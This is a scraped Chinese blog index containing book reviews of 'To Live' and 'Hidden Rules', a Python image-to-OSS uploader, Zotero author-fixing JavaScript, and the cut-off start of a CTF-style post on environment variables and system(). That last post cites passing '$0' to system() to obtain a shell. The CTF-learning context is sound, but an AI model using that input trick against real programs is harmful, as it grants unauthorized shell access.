前言\r虽然我历来学习理工科，但平生也素爱文学、历史、哲学、经济等人文社科等领域，闲暇之余总会看一看这些类别的书，看得多了，自然也想写写书评，谈一谈自己的感受。然本人文笔不佳，写的只不过是些一家之言，权当做记录与分享罢了。 《活着》我读过很多遍，每次阅读这本作品都是一气呵成。读之前我都会在手边放置一包纸巾，因为我知道，读完这部作品后，眼角总会被泪水浸湿。有时候，哭的是福贵的凄惨命运，有时候哭的是时代与社会给予福贵的沉痛打击，而在有些瞬间，我似乎感觉我也是福贵的一部分，每个人都是福贵，都在艰难地活着。 之前看过余华的一个采访，余华被问到以后是否还会继续写出像《活着》一样的作品。余华说，一个作家一辈子可能就一本像《活着》这样的作品，写完这部作品，再也写不出下一部。余华也一样，即使让他重新写一遍《活着》，他再也写不出当前版本的《活着》。 《活着》非常罕见地采用第一人称叙述。众所周知，第一人称会让读者更有代入感。然而，用余华的话来说，之所以用第一人称，是因为较之第三人称，使用第一人称写这本书他感到更为通畅。我非常赞同他的话，他写起来非常通畅，读者读起来也很通畅。其实，不只是《活着》这本书，余华的其他作品也非常适合一气呵成地读完。一旦你开始读他的书，你根本不想停下来。他的文字仿佛有一种魔力，深深地吸引着读者，文笔如水银泻地，读来无比顺畅。 梗概\r我想，还是简单总结一下《活着》的故事吧。 《活着》讲了一个很悲惨的故事。故事的主人公叫福贵。 福贵年轻的时候是地主家的少爷，他嗜赌成性，整日流连在赌场妓院，既不打理家里的家业，也不关心自己的妻儿。可是，纵使有金山银山，也禁不住福贵如此这般折腾。在赌场快活了几年后，福贵终于输光了家产，家里的几百亩良田全部输给了赌场的老大——龙二爷，他也从锦衣玉食的少爷变成了一贫如洗的佃农。从放租的，变成种地的。最惨的是，他种的还是原本属于他自己的地。 尽管福贵把家里的家产都输了个精光，他的父亲却很快接受了这一事实，并坦然地接受了自己身份的转变——从地主到农户。而福贵也经过一番折腾后，浪子回头，痛改前非。于是，他逐渐担起家庭的重担，成为了一个孝顺的儿子，负责的丈夫。只是命运开始捉弄起福贵，不断地和他开着玩笑。 先是福贵的父亲死了。这位徐家的老爷从粪缸上摔下来，摔死了。福贵父亲的死，只是悲剧的开始。 福贵的老婆叫家珍，家珍已经给福贵生了一个女儿叫凤霞，目前还怀着孕。徐家家道中落，家珍的父亲便拉着家珍回娘家，要家珍改嫁。家珍不从，但还是被强制拉了回去。后来家珍在家里诞下一子，取名为有庆（这个名字会让大家想到《周易》里面的一句话：积善之家，必有余庆）。家珍是个好女人，她带着有庆偷偷跑回徐家，甘心跟着福贵过苦日子。福贵的母亲生病了，福贵打算去街上请个郎中，可福贵恰巧碰到国民党抓壮丁打仗。他这一去就是两年。两年时间里，福贵被拉着参加大大小小的战争，幸运地存活了下来。在打仗的时候，他认识了两个人，一个叫老全，另一个叫春生。战争是残酷而无情的，是要死很多人的。老全后来被流弹打死，春生出去找吃的时候失踪，只剩福贵一个人苟且偷生。后来，福贵被解放军抓了俘虏，因为解放军优待俘虏，福贵这才回了家。 回家之后，福贵才知道，母亲去世了。凤霞也因为一次高烧，成了哑巴。解放后，因为龙二是地主，所以龙二被毙掉了。福贵为此还有些庆幸，还好自己输光了家产，否则被毙掉的就是自己了。凤霞长大后，福贵想把她许给一个五十岁的老男人，但是凤霞不肯。福贵最后也狠不下心来，决定一直养着凤霞。之后，福贵经历了人民公社和大跃进。人民公社时，餐餐大鱼大肉。大跃进时，一家人饿着肚子，好不容易找到点米，烧火的时候都不敢冒出炊烟。大跃进时期饿死了不少人，好在福贵一家人扛了过来，之后家里的田长出了粮食才慢慢地不饿肚子。 本以为生活会一直这么平平淡淡地过下去，但命运继续给福贵开着玩笑。福贵的儿子有庆死了，被抽血抽死了。有庆学校的校长生病，需要输血。校长是县长的女人，大家都争先恐后地前去献血，但只有有庆的血型满足条件。有庆很开心，可以帮助到校长，也能帮助到县长。可是抽血的医生是个王八蛋，他把有庆的血抽完了，有庆失血过多死掉了。也许是命运的捉弄，县长竟然是春生。那个时候，他出去找吃的，后来被解放军俘虏，参加了解放军。他也不叫春生了，改名叫刘解放，并在解放后当了县长。春生和福贵是生死兄弟，可是福贵的儿子因为春生的老婆死了，福贵不知所措。福贵不敢告诉家珍，怕家珍受不了。可是家珍早就感觉到了，她自己也快不行了。福贵带着家珍去看了有庆的坟，哭得不省人事。之后春生来家里赔罪，家珍破口大骂，也不让春生进门。 后来，家珍的病减轻了些。一个歪脖子的叫二喜的小伙子娶走了凤霞。二喜是个老实人，踏实肯干，对凤霞也好，福贵把凤霞交给二喜也很放心。紧接着，文化大革命开始了。春生因为当过国民党的兵，被打成走资派，每天都要被批斗。最后，春生禁受不住折磨，上吊了。 然后，凤霞死了。凤霞生孩子的时候，大出血死掉了。孩子保住了，可凤霞没了。家珍心如死灰，儿子死了，女儿也没了，白发人送黑发人的痛苦，家珍经历了两次。没过多久，家珍也死了。福贵帮家珍收了尸，福贵说，家珍死得很好，死得平平安安、干干净净，死后一点是非都没留下，不像村里有些女人，死了还有人说闲话。 现在，只剩福贵和二喜相依为命，还有凤霞和二喜的孩子，福贵的外孙，名字叫苦根。苦根四岁的时候，二喜也死了。二喜是被水泥板砸死了，死之前他还在喊苦根的名字。于是，只剩福贵和苦根了。 苦根七岁的时候，也死了。苦根病了，福贵煮了些豆子，可苦根没吃过豆子，他吃了太多的豆子，被撑死了。福贵感到无比懊悔，他责怪自己老糊涂了，给苦根煮了那么多豆子。 现在，就只剩福贵一个人了，还有一头老了的水牛。福贵买了这头水牛，水牛已经和福贵一样老了。水牛有很多个名字，福贵、家珍、凤霞、有庆、二喜、苦根，福贵每次都会和水牛说，今天家珍耕了几分地，凤霞耕了几分地，并悄悄拍打着水牛，要它不要偷懒。余晖落下，福贵牵着水牛，慢慢地朝家里走去。 感想\r我从前往后回忆了一遍，眼泪终究还是没有下来。 这篇小说很短，但讲述了很多的东西。小说的时间线沿着抗日战争、解放战争、新中国成立、人民公社运动、大跃进和文化大革命等历史大事展开。福贵与其家人的命运也随着时代的行进在不断地发生着改变，每一次家庭的变故不过是时代的滚滚洪流洒落在福贵身上的印记。福贵给自己所有的亲人送了终，把他们埋进土里，给他们修好坟。而故事的最后，只剩年迈的福贵和一头快要老死的水牛。但福贵仍然微笑着，不紧不慢地催促着老牛耕田，仿佛其凄惨的一生只是过往云烟，不值一提。 读完这本书，我看到了悲惨，但也看到了希望和乐观。我记得《谭谈交通》有一期节目，节目里面的大爷堪比现代版的福贵。父亲死了，母亲死了，妻子死了，儿女死了，只剩着自己和痴呆的弟弟，还有一条狗。当谭乔问他是怎么坚持着活下去时，他说道：往前看。 是啊，往前看。只要活着，就有希望。只要活着，就有奇迹。生命是脆弱的，也是坚强的。有时候，一丁点的挫折就让我们倒地不起；有时候，回过头看自己走过的路，才发现自己已经咬牙坚持了这么久。我们不想经历悲惨与不幸，可是当不幸降临到头上的时候，我们应当，也只能微笑着，目光坚定地望着前方，那里是明天和未来。 曾经在某个视频下看到过一条评论：我们哭着来到这个世界，当然要笑着离开。视频里的抬棺人随着奏乐跳着欢快的舞蹈，一点也不像是进行着一场葬礼。当我看到这条评论时，我的心被触动了。我不禁想起过去的种种快乐和忧伤，想到了有一天，也会面临着亲人的离世，也会经历生离死别。我想，这就是生命，这就是生活，人这一辈子，生老病死，不可避免。因此，倘若我们明白了生活的本质，为什么不义无反顾地热爱它。 好了，讲完了《活着》的故事，我该合上这本书了。 最后，愿我们都能勇敢地活着。 ","date":"2024-01-20","objectID":"/zh-cn/2024-01-20-huozhe-reading-notes/:0:0","tags":["余华","reading notes"],"title":"【读书笔记】活着————余华","uri":"/zh-cn/2024-01-20-huozhe-reading-notes/"},{"categories":["reading"],"content":"《潜规则》读书笔记","date":"2024-01-19","objectID":"/zh-cn/2024-01-19-qianguize-reading-notes/","tags":["reading","notes"],"title":"【读书笔记】潜规则————吴思","uri":"/zh-cn/2024-01-19-qianguize-reading-notes/"},{"categories":["reading"],"content":" 这本书里面没有真善美，没有良知，没有公平和正义，有的只是坑蒙拐骗、欺上瞒下、祸害苍生、鱼肉百姓。可是我相信，有黑暗，则必定有光明 ☀️☀️☀️ 前言\r我想，自己除了要读一些专业知识相关的书之外，一定也少不了读一些人文史哲的书。读专业的书是为了打磨自己的专业技能，日后步入社会尚有一技之长可供糊口养家，而读人文史哲则是为了搞清楚这世间运行的规则与人生的意义。只是，我到底是学理科的，对文科的东西缺乏敏感度，想着先随便看些书，随便写些文字，姑且算是入门吧。 这世间运行的规则可以分为两类，台面上的规则和潜规则~前者我们从幼时开始便一直在学习，而后者，或许只有等融入进社会才能触摸和感受到。 潜规则笔记\r这不是一本\"好\"书。倘若以思辨的角度来看——我是极为推崇辩证法的观点的，读一读这些\"坏\"书，也是有益于思考与个人走向成熟的。在学校的教科书里面学到的永远是善良的、美好的、乐观的，但免不了走向社会的时候你会经历一些肮脏、苦痛与折磨。若能早一些明白社会运行的道理，或许能少吃些苦头，何乐而不为。所以，我竟有些后悔没有早些读到这本书，让自己也白白受了好些年的折磨。 书名叫潜规则，讲的也是潜规则。现在大家对潜规则的认知都比较清楚，甚至潜规则这个词从名词发展成动词了。但是在上个世纪九十年代，这个词属于作者首创，因为他想揭示一些没有摆在明面上，没有写在条文里，但是却实实在在地支撑着这个社会运行的一些规则。 以下是摘抄自原书中地内容： 对于这个擅长舞文弄墨的集团 (官吏集团)，要撇开它的自我吹嘘和堂皇表白，才能发现其本来面目。在仔细揣摩了一些历史人物和事件之后，我发现支配这个集团行为的东西，经常与他们宣称遵循的那些原则相去甚远。例如仁义道德，忠君爱民，清正廉明等等。真正支配这个集团行为的东西，在更大的程度上是非常现实的利害计算。这种利害计算的结果和趋利避害的抉择，这种结果和抉择的反复出现和长期稳定性，分明构成了一套潜在的规矩，形成了许多本集团内部和各集团之间在打交道的时候长期遵循的潜规则。这是一些未必成文却很有约束力的规矩。我找不到合适的名词，姑且称之为潜规则。 潜规则有两个属性： 没有摆在台面上 很有约束力 我们需要揭开美好的面纱，直面深层的黑暗。但是始终要清楚，直面黑暗不是为了堕入黑暗，而是为了有一天，能净化这些黑暗。如果消灭不了黑暗，也没有关系，至少能让自己坦荡地度过余下的人生。 书中的第一章的名字叫：身怀利器。谁身怀利器？官吏。什么利器呢？合法伤害权。我觉得这个词也总结得很好，颇有\"圣人不死，大盗不止\"的味道。那些贪官污吏为什么能无法无天地鱼肉百姓，有一些所谓的\"人民公仆\"为什么能骑到人民的头上作威作福，就是因为他们拥有合法伤害权。这一瞬间我想到互联网上所创造的某个抽象的词语\"你法我笑\"，就是对合法伤害权的另一种诠释与调侃。这些人——十恶不赦的坏人，能把公法当作利剑，拿着政府当盾牌，死死地逮着小老百姓欺负，欺负得家破人亡，妻离子散。所谓“破家的县令，灭门的府尹“，在每个朝代都是屡见不鲜。 第二章说的是老百姓是冤大头。确实，但是谁也不想当冤大头，当了冤大头，尚能苟且偷生，不当冤大头，小命都可能不保。读完这一章就会知道，为什么当冤大头，因为抗争的代价实在是太大了，谁也承受不起。 第三章有三小篇，讲了公平的等级性。第一等公平就是明面上的，白纸黑字写着的公平。但是第一等公平往往很难实现。第二等公平，是老百姓被贪官污吏剥削后获得的公平，老百姓也普遍认可第二等公平。不难理解，当有人使用合法伤害权威慑你的时候，你心里大概率想着的是花钱消灾。摘抄书中的一段话： 以鲁迅“想当奴隶而不得的时代”为标准，我们不妨把第一等公平称为臣民级的公平，把第二等公平称为奴隶级的公平。奴隶级公平没有普遍实现的证据，就是太平天国起义。 第四章讲的是\"当贪官的理由\"，作者列举了当贪官和当清官的利害得失，最后得出了显而易见的结论：当贪官比当清官划算。人在社会中，避免不了一些世俗的计较，当你有牵挂的时候，有掣肘的时候，还是老老实实当贪官吧。中华上下五千年，出了几个海瑞呢。 接下来是讲恶政，说恶政是一面筛子，筛子筛去的是清官和好官，留下的是贪官和奸官，然后形成一个恶性循环，留下的贪官越来越多，政自然也是越来越恶。 接下来的一章叫皇上也是冤大头，因为皇上也会被官吏集团糊弄。以文章中的信息传达的例子，信息链是这样的：老百姓→衙役→书吏→州县官→府官→省官→中央各部→内阁→皇帝。那么信息在传递过程中，肯定存在失真现象。不仅存在失真，信息还会被加工。在每一道关卡，在无数信息中，注意了什么，没注意什么，选择什么，忽略什么，说多说少，说真说假，强调哪些方面，隐瞒哪些方面，什么是主流，什么是支流，说得清楚，说不清楚，这都是各级官吏每天面对的选择。由此看来，皇帝也是很好被糊弄的。 然后是摆平违规者。这一章举了一些例子，表明上潜规则虽然是一些见不得人的，一些恶臭满盈的规则，但是大家还是会在规则里面玩，不会跳出规则。并且那些跳出规则的人，是要受到惩罚的。因此，潜规则有一些特殊的属性。你要么遵守与适应规则，你要么被物理消灭。 下一篇讲的是\"论资排辈也是好东西\"。一开始我也不理解这个标题，“论资排辈\"这个词相比很多人都厌恶，因为大家更愿意讲的应该是\"多劳多得”。但是作者为什么说论资排辈也是好东西呢？这是因为，在恶劣的政治生态环境下，“论资排辈\"能稍微扼杀一些不正之风。然而，其功能却是有限的。因为政治生态已经非常恶劣了，这个时候除了革命或者彻底的改革，否则其他方法是无法彻底清除顽疾的。所以，论资排辈是治标不治本。可是对于有些内心正直，却又没有能力发起改革或革命的人，论资排辈是很好的挡箭牌。所谓，文无第一，武无第二。用一个无法定量的标准来筛选人才，最终的结果就是关系户被称之为人才，而那些真正有才能的人往往会被埋没。现如今，高考，永远是最公平的考试，没有之一。而那些鼓吹着要取消高考的人，大概率不是蠢，就是纯纯的坏。 接着，讲的是新官堕落定律。先放一段原文： 所谓堕落，当然是从圣贤要求的标准看。如果换成新官适应社会和熟悉业务的角度，我们看到的则是一个重新学习和迅速进步的过程，一个接受再教育的过程。第一次是接受圣贤的教育，第二次则是接受胥吏衙役和人间大学的教育。第一次教育教了官员们满口仁义道德，第二次教育教了他们一肚子男盗女娼。 为什么会堕落呢？还是前面的那些原因，因为如果你不堕落，你可能会被物理消灭。就算不被物理消灭，你可能要挨饿受冻，要防着明枪暗箭，甚至会连累自己的至亲之人。而在考虑了利益、亲情、前途之后，大部分人会做出堕落的选择，就这么简单。所以，我们称那些没有堕落的人为英雄。 然后晏式转型和崇祯死弯，一个讲臣子，一个讲皇帝。晏子作为臣子，想要遵守仁义道德，不媚上欺下，还要得到皇帝的首肯，得到皇帝的首肯之前，还要被责骂和打压一番。怎一个惨字了得。至于崇祯，那就更惨了。内忧外患，无力回天。特别是，崇祯所经历的环境已经成为了一个恶行循环，有贪官污吏→老百姓造反→拨款镇压造反→官员进一步剥削百姓→不造反的百姓被剥削得也造反了→亡国。而崇祯一人，无法与这庞大的官吏集团对抗。所以啊，崇祯亡国是必然的，只是过程的快慢罢了。 之后的笑话天道和造化的报应, 以及后面的理解迷信这两篇讲的是\"封建迷信”。当我们不知道如何和一个强大的对手抗衡的时候，特别是这个对手非常的邪恶而又无法战胜，我们会说\"他迟早会遭报应的，老天爷不会放过他\"。但现实是残酷的，就像那句话说的，好人不长命，祸害活千年。所以，到底有没有天道，有没有报应。我想，现实是没有的，但是历史是有的。就像那块石碑：尔俸尔禄，民膏民脂。下民易虐，上天难欺。尽管在一时的条件下，坏人永远逍遥法外；但是在历史的长河中，大浪淘沙，坏人终究会被钉在耻辱柱上，受后世之人的唾弃。因此，我们心中要相信天道，敬畏天道。 最后讲了点我们的人格理想，包括仁孝人格、雷锋人格、人格与时代、公民人格、公民人格与传统、公民人格与终极价值。仁孝人格，是儒家所推崇的，但是举的例子很有意思，是东汉的赵宣的例子，打着仁孝的幌子，做一些沽名钓誉之事。不过令人不解的是，在父母的墓中造人，到底算不算孝。儒家不是还有句话，叫做无后为大（虽然这句话的含义饱受争议）。 雷锋人格，我直接放原文： 雷锋所代表的是一种以\"为人民服务\"（人民不包括敌人）为核心的理想人格，据说它合乎科学规律，顺应历史潮流，代表人类未来。具有这种人格的人可以当接班人，生得伟大，死且不朽。这种人格理想曾经在共和国的历史上雄踞二三十年，为数以亿计的人们提供了为什么生活和怎样生活的标准答案。 后面讲的公民、人格、时代的关系。在不同的时代背景下，公民人格的价值不同。只放一句很有深意的话：大盗不死，圣人不止。 整个《潜规则》看完，有一些震撼，有一些收获。书中的很多例子，都是在一个政权的后期和末期发生的，或许一开始，还是有光明和希望的，只是这希望，慢慢被黑暗所湮没。 尽管有这么些潜规则，我想，我们还是应该心怀阳光，做一个有价值的人，做一些有价值的事情。这个目的，与规则无关。 摘抄和评论\r以下是对书中内容的摘录和我的评价（前面是书中的原文，破折号后面是我的评论）： 陈奉只是万历年间诸多的矿使税监之一。《明史》用了半页纸点各地陈奉们的名字，陈奉不过是其中的五个字。而这一个陈奉的脚下就躺着一片经他手淘汰出局的清官。——历史的厚重感，扑面而来。 冤大头是贪官污吏的温床。——没有人想当冤大头，但是有什么办法呢？不当冤大头的结局就是被物理消灭。 现在，我们离宗族大姓毗邻而居、宗亲世交触目皆是的时代已经很远了，我们离革命同志团结一心兴无灭资推翻三座大山的时代也不近了。出门上班，满眼小商小贩雇主雇员，下班上路，","date":"2024-01-19","objectID":"/zh-cn/2024-01-19-qianguize-reading-notes/:0:0","tags":["reading","notes"],"title":"【读书笔记】潜规则————吴思","uri":"/zh-cn/2024-01-19-qianguize-reading-notes/"},{"categories":["tools"],"content":"use python to upload images to aliyun oss bucket","date":"2024-01-16","objectID":"/zh-cn/2024-01-15-use-python-to-upload-images-to-aliyunoss/","tags":["blog","python","oss"],"title":"使用python批量处理markdown文件中的图片","uri":"/zh-cn/2024-01-15-use-python-to-upload-images-to-aliyunoss/"},{"categories":["tools"],"content":" 记录一个小工具，用于批量处理 markdown 文件中的图片，将其下载下来，然后上传到 aliyun OSS 存储中。 使用场景\r我目前遇到过四个场景。 场景一： 前段时间在使用语雀的时候，把语雀笔记导出为 markdown 后，发现导出后的 markdown 文件中的图片链接指向的是语雀的 CDN，也就是说，这些图片还是存储在语雀的服务器上的。博客的资源当然是存储一份到自己的本地是最安全的，所以我需要把这些图片下载到本地，然后上传到我自己的 oss 存储中。 场景二： 写博客的时候，先把图片存储在本地，然后配合 Picgo-Core 使用 Typora 的图片上传。但是，这个工具的批量上传有一些 bug，图片链接的顺序是乱的。图片少的话还好，图片比较多的话，那真的将是灾难。 场景三： 在场景一的基础上，把下载下来的 markdown 又添加了一些新的内容，就导致了有一些图片是存储在别的服务器上，有一些图片是存储在本地。但是，我最后都需要把这些图片上传到 oss 中。 场景四： 把存储在 A 服务器上的图片全部下载后上传到 B 服务器，然后替换图片的 url。 工具脚本\r工具的处理逻辑如下： 读取 markdown 文件 提取出 markdown 中的图片链接 如果图片是 http 开头的网络图片，且域名不是 xxx.com，那么下载图片，然后上传到 oss 的一个 bucket 中 如果图片是本地图片，直接上传到 oss 替换图片链接得到新的 md 文件 工具的脚本如下： \"\"\" 使用前请先安装： pip install markdown beautifulsoup4 requests oss2 本工具的功能如下： 1. 读取markdown文件 2. 提取出markdown中的图片链接 3. 如果图片是http开头的网络图片，且域名不是xxx.com，那么下载图片，然后上传到oss的一个bucket中 4. 如果图片是本地图片，直接上传到oss 5. 替换图片链接得到新的markdown文件 Usage: python tool.py markdown1.md markdown2.md \"\"\" # coding: utf-8 # author: roderick # date: 2024-01-10 import os import markdown import requests from bs4 import BeautifulSoup from urllib.parse import urlparse import oss2 import uuid # 要排除的域名，这些域名下的图片不处理 EXCLUDE_TARGET_DOMAIN = [\"img.roderickchan.cn\", \"xxxxx.oss-cn-hangzhou.aliyuncs.com\"] # 新的访问前缀 NEW_URL_FOR_IMAGE = \"https://xxxxx.oss-cn-hangzhou.aliyuncs.com\" # 存储图片的路径的前缀，比如我是存储在img文件夹下面 IMAGE_PREFIX = \"img/\" # 新的图片的链接为：NEW_URL_FOR_IMAGE/IMAGE_PREFIX/img_filename # 建议使用子权限账户，只赋予OSS读写权限 OSS_ACCESS_KEY_ID = \"\" OSS_ACCESS_KEY_SECRET = \"\" OSS_ENDPOINT = \"https://oss-cn-hangzhou.aliyuncs.com\" BUCKET_NAME = \"xxxxx\" # 连接aliyun的oss bucket = oss2.Bucket(oss2.Auth(OSS_ACCESS_KEY_ID, OSS_ACCESS_KEY_SECRET), OSS_ENDPOINT, BUCKET_NAME) # 拼接路径，替换掉\\ def joinpath(*args, **kwargs): return os.path.join(*args, **kwargs).replace(\"\\\\\", \"/\") # 每个实例处理一个文件 class MarkdownFileProcessor: def __init__(self, filepath: str, backup=True) -\u003e None: self.get_filename = self._outer() self.markdown_filepath = filepath self.backup = backup # 使用\"序号-UUID\"这样的格式来重命名 def _outer(self): start = 0 def _inner(): nonlocal start start += 1 return f\"{start}-{uuid.uuid4()}\" return _inner # 使用get下载图片 def _download_image(self, url, filename): response = requests.get(url, stream=True) with open(filename, 'wb') as out_file: out_file.write(response.content) print(f\"[+++] [{self.markdown_filepath}] Download_image and save: {filename}\") del response # 把需要上传的图片上传到oss def _upload_to_oss(self, rename=True, *filenames): src_dict = {} for fn in filenames: if rename: # 文件名 nn = self.get_filename() + os.path.splitext(fn)[1] else: nn = os.path.basename(fn) if not os.path.exists(fn): src_dict[fn] = fn.replace(\"\\\\\", \"/\") print(f\"[!!!] [{self.markdown_filepath}] file {fn} not exist!!!\") continue try: bucket.put_object_from_file(joinpath(IMAGE_PREFIX, nn), fn) src_dict[fn] = joinpath(NEW_URL_FOR_IMAGE, IMAGE_PREFIX, nn) print(f\"[+++] [{self.markdown_filepath}] bucket.put_object_from_file({os.path.join(IMAGE_PREFIX, nn)}, {fn}) done.\") except: src_dict[fn] = fn.replace(\"\\\\\", \"/\") print(f\"[!!!] [{self.markdown_filepath}] bucket.put_object_from_file({os.path.join(IMAGE_PREFIX, nn)}, {fn}) error!!!\") return src_dict # 处理文件 def _process_markdown(self): filename = self.markdown_filepath with open(filename, 'r', encoding='utf-8') as f: text = f.read() need_download = [] need_push = [] html = markdown.markdown(text) soup = BeautifulSoup(html, features=\"html.parser\") for img in soup.find_all('img'): src = img.get('src') parsed_url = urlparse(src) if parsed_url.scheme in ['http', 'https']: if parsed_url.netloc not in EXCLUDE_TARGET_DOMAIN: need_download.append(src) elif not parsed_url.scheme: need_push.append(src) return need_download, need_push # 这两个列表存储的都是完整的url，且都是字符串，前者是http url，后者是本地url # 处理图片 def _process_img(self, need_download: list, need_push: list): ori_src = need_download.copy() + need_push.copy() use_dict = {} for x in need_download: fn = os.path.split(x)[1] self._download_image(x, fn) use_dict[fn] = x need_push.append(fn) new_src = self._upload_to_oss(True, *need_push) # 替换文本 if self.backup","date":"2024-01-16","objectID":"/zh-cn/2024-01-15-use-python-to-upload-images-to-aliyunoss/:0:0","tags":["blog","python","oss"],"title":"使用python批量处理markdown文件中的图片","uri":"/zh-cn/2024-01-15-use-python-to-upload-images-to-aliyunoss/"},{"categories":["questions"],"content":"edit zotero items using javascript api","date":"2024-01-10","objectID":"/zh-cn/2024-01-10-edit-zotero-items-using-javascript-api/","tags":["blog","zotero"],"title":"解决Zotero条目的作者混乱问题","uri":"/zh-cn/2024-01-10-edit-zotero-items-using-javascript-api/"},{"categories":["questions"],"content":" 记录下最近在使用 zotero 的时候，遇到的一个不大不小的问题，以及解决方案。 问题\r我最近发现 zotero 在解析文章的时候，作者的解析会出现以下bug： 把作者的名和姓解析反了 一长串的英文作者，例如 A B, C D, E F，有时候会被解析到一个作者里面，作者的 last name 是 A，但是作者的 first name 会被解析为 B, C D, E F 一长串中文作者，例如 张三，李四，王五，赵六，会被解析到一个作者中 张三 作为姓氏，李四，王五，赵六 作为名字 其他乱七八糟的名字的问题 需要说明的是，zotero 的作者顺序是 last name 也就是姓氏在前，first name 也就是名字在后，且 zotero 的每个作者支持 single field 和 two fields，前者只保留一个字段，后者同时保留姓和名。举例来说，如果一个作者叫 Han Meimei，前面是姓氏，后面是名字。那么当为 single field 的时候，会合并为 Meimei Han，并被放在一个字段里面；当为 two fields 时，last name 是 Han，而 first name 是 Meimei。 解决方案\r针对第一个问题，刚开始的时候，我的解决方案是：手动修改条目的名和姓。毕竟有问题的是个别条目，大多数还是没有问题的。后来发现，出现问题的条目变多之后，特别是有的文章作者很多的时候，那就是灾难了。加上 zotero 的修改实在是很难用，真的改不动。 针对第二个和第三个问题，刚开始我也是手动修改的。后来发现 Jasminum 插件有个功能 Merge Names，能把姓和名合并在一起。 但是，特喵的这个插件合并的时候并不会添加逗号，也不好用。起码解决不了我的问题。但是这个插件的设置语言功能还是不错的，可以批量设置，且插件还有一些其他好用的功能。 既然 zotero 支持插件，那么 zotero 应该也会提供即时运行窗口，能运行脚本。发现，确实有： 可惜只支持运行 javascript，不支持 python，那就写 javascript 吧。 这里提供我的脚本： function MergeAndSplitNames() { var items = Zotero.getActiveZoteroPane().getSelectedItems(); //alert('----'); for (var i = 0; i \u003c items.length; i++) { var curItem = items[i]; if (!curItem.isRegularItem()) { continue; } var curCreator = curItem.getCreators(); var cl = curCreator.length; var authors = curCreator.filter((x) =\u003e x.creatorType === undefined || x.creatorType === \"author\"); if (authors.length != curCreator.length) { var userConfirmed = confirm(\"检测到存在editot的creator，是否继续？\"); if (!userConfirmed) { return; } } // 去除firstName和lastName var fullName = \"\"; for (var cc of curCreator) { fullName += cc.lastName.trim() + \",\"; if (cc.firstName.trim() != '') { // var gogo = cc.firstName.trim().indexOf(\" \") != -1; // if(gogo){ // fullName += cc.firstName + \",\"; // }else { // } alert(\"[Error] 请检查作者firstName：\" + cc.firstName); return; } } if (fullName === \"\") { alert(\"[Error] 作者名字为空啊\"); return; } var newNames = fullName.split(\",\").map(x =\u003e x.trim()).filter(x =\u003e x != \"\"); if (newNames.length === 0) { alert(\"[Error] 作者名字为空啊2\"); return; } var newAuthors = []; for (var n of newNames) { if (n.indexOf(' ') != -1) { // 有空格 var nn = n.split(\" \"); newAuthors.push({ \"firstName\": nn[1], \"lastName\": nn[0], \"creatorType\": \"author\" }); } else { // 没有空格 newAuthors.push({ \"firstName\": \"\", \"lastName\": n, \"creatorType\": \"author\" }); } } curItem.setCreators(newAuthors); curItem.saveTx(); alert(curItem.getField('title') + \"操作完成！\") } } function inputName() { // Get first selected item var selectedItems = ZoteroPane.getSelectedItems(); var curItem = selectedItems[0]; var condi = curItem \u0026\u0026 !curItem.isNote() \u0026\u0026 curItem.isRegularItem(); if (condi) { if (!confirm(\"确定要手动覆盖作者吗？\")) return; var i = prompt(\"请输入作者,使用分号或逗号分割：\", \"\"); if (i.trim() === \"\") { return; } var names = i.split(/[,，;；]+/).map(x =\u003e x.trim()).filter(x =\u003e x != \" \"); var newAuthors = []; for (var n of names) { if (n.indexOf(' ') != -1) { // 有空格 var nn = n.split(\" \"); newAuthors.push({ \"firstName\": nn[1], \"lastName\": nn[0], \"creatorType\": \"author\" }); } else { // 没有空格 newAuthors.push({ \"firstName\": \"\", \"lastName\": n, \"creatorType\": \"author\" }); } } curItem.setCreators(newAuthors); curItem.saveTx(); alert(curItem.getField('title') + \"操作完成！\"); } } function exchangefirstNamelastName() { var items = Zotero.getActiveZoteroPane().getSelectedItems(); //alert('----'); for (var i = 0; i \u003c items.length; i++) { var curItem = items[i]; if (!curItem.isRegularItem()) { continue; } var curCreator = curItem.getCreators(); for (var c of curCreator) { var temp = c.firstName; c.firstName = c.lastName; c.lastName = temp; } curItem.setCreators(curCreator); curItem.saveTx(); alert(curItem.getField('title') + \"操作完成！\"); } } // xxx 执行xxx函数 console.log 找不出输出，建议使用 alert/prompt/confirm 等函数 需要执行的时候，选中条目，然后点击 Run 就可以 js 开发成本很低，人生苦短，我也用js 所以，除了费大力气写个插件，还是可以在本地运行 javascript 代码来完成对选中条目信息的修改的。有的功能只需要简单写几行代码就好。 提供的代码并不完全符合所有场景，一方面是记录下 zotero local javascript api 的使用方式，一方面是记录解决的这几个问题。 写代码有不懂的，直接问 ChatGPT 即可。 参考\rdev:client_coding:javascript_api [Zotero Documentation] ","date":"2024-01-10","objectID":"/zh-cn/2024-01-10-edit-zotero-items-using-javascript-api/:0:0","tags":["blog","zotero"],"title":"解决Zotero条目的作者混乱问题","uri":"/zh-cn/2024-01-10-edit-zotero-items-using-javascript-api/"},{"categories":["pwn-trick"],"content":" 很久之前写的一篇关于环境变量的总结博客，当时没有写完，最近又翻找出来了，有些虎头蛇尾 😅 从 System 函数的实现看 Linux 下对环境变量的处理\r前言\r操作系统中的环境变量灵活而强大，Linux 系统中常用的环境变量有 HOME/USER/SHELL/PATH/http_proxy 等，许多程序的运行都依赖环境变量的设置。环境变量也是一个常见的攻击面，环境变量设置不当将可能导致提权、RCE 等系统风险。本篇文章记录了 Linux 下对环境变量的处理，涉及到普通程序中的环境变量处理和一个特殊的程序—— bash 中的环境变量处理。 提到环境变量，就不得不提到 execve 系统调用。这个系统调用的原型如下： int execve(const char *pathname, char *const argv[], char *const envp[]); 第一个参数是可执行程序的路径或一个脚本的路径，如果是脚本，则通常(当然存在例外)需要在脚本内指定解释器，即需要以 #!xxxx 开头。 第二个参数是传递给可执行文件的参数，是一个字符串数组，且数组的第一个元素通常是执行文件的文件名，最后一个元素须是 NULL。 第三个参数是传递给新进程的环境变量，也是一个字符串数组，每个环境变量的格式为 key=value，数组的最后一个元素也须是 NULL。 在载入一个可执行的 ELF 文件时，参数数组和环境变量数组会分别传递给程序中定义的 main 函数的第二个和第三个参数，其通用的函数原型为： int main(int argc, char *argv[], char *envp[]); 对于 main 函数的参数和返回值就不做过多的介绍。 但是在实际使用 C 库函数编程的时候，如果需要执行一条或多条系统命令，我们并不会直接使用 execve 系统调用，而会使用 system 函数。 犹记得有道题留的后门很有趣：只能输入两个字符，然后将输入作为 system 函数的参数进行执行。这里限制了输入只能是特定的符号和数字，不能有字母。刚开始看到这个后门有点摸不着头脑，直到想出了使用 $0 作为输入，发现竟然可以拿到 shell。 学过 shell 脚本的都知道，$1 是 shell 脚本的第一个参数，而 $0 